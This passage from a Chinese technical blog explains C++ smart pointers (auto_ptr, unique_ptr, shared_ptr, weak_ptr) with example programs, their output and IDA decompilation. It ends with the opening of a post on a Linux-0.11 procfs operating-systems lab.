<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Auto</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Auto</span>() &#123; cout &lt;&lt; <span class="string">&quot;Auto create&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">Auto</span>() &#123; cout &lt;&lt; <span class="string">&quot;Auto delete&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">    <span class="keyword">int</span> key1 = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> key2 = <span class="number">20</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">auto_ptr&lt;Auto&gt; <span class="title">test</span><span class="params">(<span class="keyword">new</span> Auto)</span></span>;</span><br><span class="line">    <span class="keyword">int</span> key1 = (*test).key1;</span><br><span class="line">    <span class="keyword">int</span> key2 = test-&gt;key2;</span><br><span class="line">    <span class="keyword">int</span> key3 = key1 + key2;</span><br><span class="line">    cout &lt;&lt; key3 &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>栈上的对象会在当前语句块结束时释放，堆上的对象需要使用 delete 释放</li>
<li>而 <code>auto_ptr</code> 属于栈上的对象，在它的析构函数中会尝试 delete 目标对象</li>
</ul>
<p>IDA 分析如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v5 = (Auto *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">8uLL</span>);</span><br><span class="line">Auto::<span class="built_in">Auto</span>(v5); <span class="comment">/* Auto的构造函数 */</span></span><br><span class="line">std::auto_ptr&lt;Auto&gt;::<span class="built_in">auto_ptr</span>(v8, v5); <span class="comment">/* auto_ptr的构造函数 */</span></span><br><span class="line">v6 = *(_DWORD *)std::auto_ptr&lt;Auto&gt;::<span class="keyword">operator</span>*(v8);</span><br><span class="line">v7 = v6 + *(_DWORD *)(std::auto_ptr&lt;Auto&gt;::<span class="keyword">operator</span>-&gt;(v8) + <span class="number">4</span>);</span><br><span class="line">v3 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;std::cout, v7);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">std::auto_ptr&lt;Auto&gt;::~<span class="built_in">auto_ptr</span>(v8); <span class="comment">/* auto_ptr的析构函数 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>auto_ptr</code> 的析构函数中会自动释放 Auto（传入对象）：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall std::auto_ptr&lt;Auto&gt;::~<span class="built_in">auto_ptr</span>(Auto **a1)</span><br><span class="line">&#123;</span><br><span class="line">  Auto *v1; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v1 = *a1;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    Auto::~<span class="built_in">Auto</span>(*a1);</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v1, <span class="number">8uLL</span>)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由 <code>auto_ptr</code> 创建的对象仍然具有指针的性质，其原因是 <code>auto_ptr</code> 对 <code>*</code>，<code>-&gt;</code> 等符号进行了重构</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall std::auto_ptr&lt;Auto&gt;::<span class="keyword">operator</span>*(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *(_QWORD *)a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall std::auto_ptr&lt;Auto&gt;::<span class="keyword">operator</span>-&gt;(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *(_QWORD *)a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：对于 <code>*</code>，<code>-&gt;</code> 的重构只是实现了解引用而已，不负责具体的偏移</li>
</ul>
<p><strong>unique_ptr</strong></p>
<p><code>unique_ptr</code> 和 <code>auto_ptr</code> 的用法几乎一样，另外添加了如下几个特性：</p>
<ul>
<li>基于排他所有权模式：两个指针不能指向同一个资源</li>
<li>无法进行左值 <code>unique_ptr</code> 复制构造，也无法进行左值复制赋值操作，但允许临时右值赋值构造和赋值</li>
<li>在 STL 容器中使用 <code>unique_ptr</code>，不允许直接赋值 </li>
<li>支持对象数组的内存管理</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">unique_ptr&lt;string&gt; <span class="title">p1</span><span class="params">(<span class="keyword">new</span> string(<span class="string">&quot;11111111&quot;</span>))</span></span>;</span><br><span class="line">    <span class="function">unique_ptr&lt;string&gt; <span class="title">p2</span><span class="params">(<span class="keyword">new</span> string(<span class="string">&quot;22222222&quot;</span>))</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//p1 = p2;					    // 禁止左值赋值</span></span><br><span class="line">    <span class="comment">//unique_ptr&lt;string&gt; p3(p2);	// 禁止左值赋值构造</span></span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p1:&quot;</span> &lt;&lt; p1.<span class="built_in">get</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p2:&quot;</span> &lt;&lt; p2.<span class="built_in">get</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="function">unique_ptr&lt;string&gt; <span class="title">p3</span><span class="params">(std::move(p2))</span></span>; </span><br><span class="line">    p2 = std::<span class="built_in">move</span>(p1);	<span class="comment">// 使用move把左值转成右值就可以赋值了,效果和auto_ptr赋值一样</span></span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p1:&quot;</span> &lt;&lt; p1.<span class="built_in">get</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p2:&quot;</span> &lt;&lt; p2.<span class="built_in">get</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p3:&quot;</span> &lt;&lt; p3.<span class="built_in">get</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p1:<span class="number">0x559625bfdeb0</span></span><br><span class="line">p2:<span class="number">0x559625bfdee0</span></span><br><span class="line">-------------------</span><br><span class="line">p1:<span class="number">0</span></span><br><span class="line">p2:<span class="number">0x559625bfdeb0</span></span><br><span class="line">p3:<span class="number">0x559625bfdee0</span></span><br></pre></td></tr></table></figure>
<p>IDA 分析如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> std::allocator&lt;<span class="keyword">char</span>&gt;::<span class="built_in">allocator</span>(v27, argv, envp);</span><br><span class="line"> v23 = (<span class="keyword">void</span> *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">0x20</span>uLL);</span><br><span class="line"> std::string::basic_string&lt;std::allocator&lt;<span class="keyword">char</span>&gt;&gt;(v23, <span class="string">&quot;11111111&quot;</span>, v27);</span><br><span class="line"> std::unique_ptr&lt;std::string&gt;::unique_ptr&lt;std::default_delete&lt;std::string&gt;,<span class="keyword">void</span>&gt;(v25, v23); <span class="comment">/* unique_ptr的构造函数 */</span></span><br><span class="line"> std::allocator&lt;<span class="keyword">char</span>&gt;::~<span class="built_in">allocator</span>(v27);</span><br><span class="line"> std::allocator&lt;<span class="keyword">char</span>&gt;::<span class="built_in">allocator</span>(v27, v23, v3);</span><br><span class="line"> v24 = (<span class="keyword">void</span> *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">0x20</span>uLL);</span><br><span class="line"> std::string::basic_string&lt;std::allocator&lt;<span class="keyword">char</span>&gt;&gt;(v24, <span class="string">&quot;22222222&quot;</span>, v27);</span><br><span class="line"> std::unique_ptr&lt;std::string&gt;::unique_ptr&lt;std::default_delete&lt;std::string&gt;,<span class="keyword">void</span>&gt;(v26, v24); <span class="comment">/* unique_ptr的构造函数 */</span></span><br><span class="line"> std::allocator&lt;<span class="keyword">char</span>&gt;::~<span class="built_in">allocator</span>(v27);</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"> v10 = std::move&lt;std::unique_ptr&lt;std::string&gt; &amp;&gt;(v26); <span class="comment">/* 把左值转成右值 */</span></span><br><span class="line"> std::unique_ptr&lt;std::string&gt;::<span class="built_in">unique_ptr</span>(v27, v10); <span class="comment">/* unique_ptr的构造函数 */</span></span><br><span class="line"> v11 = std::move&lt;std::unique_ptr&lt;std::string&gt; &amp;&gt;(v25); <span class="comment">/* 把左值转成右值 */</span></span><br><span class="line"> std::unique_ptr&lt;std::string&gt;::<span class="keyword">operator</span>=(v26, v11);</span><br><span class="line"> </span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"> std::unique_ptr&lt;std::string&gt;::~<span class="built_in">unique_ptr</span>(v27);</span><br><span class="line"> std::unique_ptr&lt;std::string&gt;::~<span class="built_in">unique_ptr</span>(v26);</span><br><span class="line"> std::unique_ptr&lt;std::string&gt;::~<span class="built_in">unique_ptr</span>(v25)</span><br></pre></td></tr></table></figure>
<p><strong>shared_ptr</strong></p>
<p><code>shared_ptr</code> 基于非排他所有权模式：允许多个指针指向同一个资源</p>
<ul>
<li>当复制或拷贝时，引用计数加 “1”</li>
<li>当智能指针析构时，引用计数减 “1”</li>
<li>如果计数为 “0”，代表已经没有指针指向这块内存，那么就释放它</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deleteStr</span><span class="params">(string* p)</span> </span>&#123; <span class="comment">/* 允许自定义析构函数 */</span></span><br><span class="line">    cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string* str = <span class="keyword">new</span> <span class="built_in">string</span>(<span class="string">&quot;11111111&quot;</span>);</span><br><span class="line">    <span class="function">std::shared_ptr&lt;string&gt; <span class="title">p1</span><span class="params">(str, deleteStr)</span></span>;</span><br><span class="line">    <span class="function">std::shared_ptr&lt;string&gt; <span class="title">p2</span><span class="params">(p1)</span></span>;</span><br><span class="line">    <span class="function">std::shared_ptr&lt;string&gt; <span class="title">p3</span><span class="params">(p2)</span></span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p1 count = &quot;</span> &lt;&lt; p1.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p2 count = &quot;</span> &lt;&lt; p2.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p3 count = &quot;</span> &lt;&lt; p3.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    p1 = <span class="literal">NULL</span>;</span><br><span class="line">    p2 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p1 count = &quot;</span> &lt;&lt; p1.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p2 count = &quot;</span> &lt;&lt; p2.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p3 count = &quot;</span> &lt;&lt; p3.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    p3 = <span class="literal">NULL</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;22222222&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p1 count = <span class="number">3</span></span><br><span class="line">p2 count = <span class="number">3</span></span><br><span class="line">p3 count = <span class="number">3</span></span><br><span class="line">p1 count = <span class="number">0</span> <span class="comment">/* p1被置空 */</span></span><br><span class="line">p2 count = <span class="number">0</span> <span class="comment">/* p2被置空 */</span></span><br><span class="line">p3 count = <span class="number">1</span> <span class="comment">/* shared_ptr的计数器为&quot;1&quot; */</span></span><br><span class="line"><span class="number">11111111</span> <span class="comment">/* 当shared_ptr的计数器为&quot;0&quot;时,调用析构函数 */</span></span><br><span class="line"><span class="number">22222222</span></span><br></pre></td></tr></table></figure>
<p><strong>weak_ptr</strong></p>
<p><code>weak_ptr</code> 是为配合 <code>shared_ptr</code> 而引入的一种智能指针，它只可以从一个 <code>shared_ptr</code> 或另一个 <code>weak_ptr</code> 对象构造</p>
<p><code>weak_ptr</code> 提供的是一个弱引用：</p>
<ul>
<li>弱引用不更改引用计数，类似普通指针</li>
</ul>
<p><code>shared_ptr</code> 提供的是一个强引用：</p>
<ul>
<li>当对象被创建时，计数为 “1”，每创建一个变量引用该对象时，该对象的计数就增加“1”，当上述变量销毁时，对象的计数减 “1”，当计数为 “0” 时，这个对象也就被析构了 </li>
<li>强引用计数在很多种情况下都是可以正常工作的，但是也有不凑效的时候，当出现循环引用时，就会出现严重的问题</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">parent</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">children</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> shared_ptr&lt;parent&gt; parent_ptr;</span><br><span class="line"><span class="keyword">typedef</span> shared_ptr&lt;children&gt; children_ptr;</span><br><span class="line"><span class="keyword">typedef</span> weak_ptr&lt;parent&gt; parent_ptr2;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">parent</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">parent</span>() &#123; std::cout &lt;&lt;<span class="string">&quot;destroying parent\n&quot;</span>; &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    children_ptr children;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">children</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">children</span>() &#123; std::cout &lt;&lt;<span class="string">&quot;destroying children\n&quot;</span>; &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    parent_ptr parent;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">parent_ptr <span class="title">father</span><span class="params">(<span class="keyword">new</span> parent())</span></span>;</span><br><span class="line">    <span class="function">children_ptr <span class="title">son</span><span class="params">(<span class="keyword">new</span> children())</span></span>;</span><br><span class="line"> </span><br><span class="line">    father-&gt;children = son;</span><br><span class="line">    son-&gt;parent = father;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;father count = &quot;</span> &lt;&lt; father.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;son count = &quot;</span> &lt;&lt; son.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;begin test\n&quot;</span>;</span><br><span class="line">    <span class="built_in">test</span>();</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;end test\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 <code>parent</code> 和 <code>children</code> 对象互相引用，它们的引用计数都是 “2”，不能自动释放</li>
<li>并且此时这两个对象再无法访问到</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">begin test</span><br><span class="line">father count = <span class="number">2</span></span><br><span class="line">son count = <span class="number">2</span></span><br><span class="line">end test</span><br></pre></td></tr></table></figure>
<p>使用弱引用 <code>weak_ptr</code> 即可打破循环：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">parent</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">children</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> shared_ptr&lt;parent&gt; parent_ptr;</span><br><span class="line"><span class="keyword">typedef</span> shared_ptr&lt;children&gt; children_ptr;</span><br><span class="line"><span class="keyword">typedef</span> weak_ptr&lt;parent&gt; parent_ptr2;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">parent</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">parent</span>() &#123; std::cout &lt;&lt;<span class="string">&quot;destroying parent\n&quot;</span>; &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    children_ptr children;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">children</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">children</span>() &#123; std::cout &lt;&lt;<span class="string">&quot;destroying children\n&quot;</span>; &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    parent_ptr2 parent;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">parent_ptr <span class="title">father</span><span class="params">(<span class="keyword">new</span> parent())</span></span>;</span><br><span class="line">    <span class="function">children_ptr <span class="title">son</span><span class="params">(<span class="keyword">new</span> children())</span></span>;</span><br><span class="line"> </span><br><span class="line">    father-&gt;children = son;</span><br><span class="line">    son-&gt;parent = father;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;father count = &quot;</span> &lt;&lt; father.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;son count = &quot;</span> &lt;&lt; son.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;begin test\n&quot;</span>;</span><br><span class="line">    <span class="built_in">test</span>();</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;end test\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">begin test</span><br><span class="line">father count = <span class="number">1</span> <span class="comment">/* 由于children使用弱指针,因此children并不会使father的计数器增加 */</span></span><br><span class="line">son count = <span class="number">2</span></span><br><span class="line">destroying parent</span><br><span class="line">destroying children</span><br><span class="line">end test</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/17/HIT-OSLab8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/17/HIT-OSLab8/" class="post-title-link" itemprop="url">HIT-OSLab8</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-11-17 19:27:56 / Modified: 19:29:14" itemprop="dateCreated datePublished" datetime="2023-11-17T19:27:56+08:00">2023-11-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>HIT-OSLab8</strong></p>
<p>实验目的：</p>
<ul>
<li>掌握虚拟文件系统的实现原理</li>
<li>实践文件、目录、文件系统等概念</li>
</ul>
<p>实验内容：</p>
<ul>
<li>在 Linux-0.11 上实现 procfs(proc文件系统) 内的 psinfo 节点，当读取此节点的内容的时候，可得到系统当前所有进程的状态信息</li>
<li>在 Linux-0.11 上实现 procfs(proc文件系统) 内的 hdinfo 节点，当读取此节点的内容的时候，可以打印出硬盘的一些信息 </li>
<li>参考格式如下：</li>
</ul>
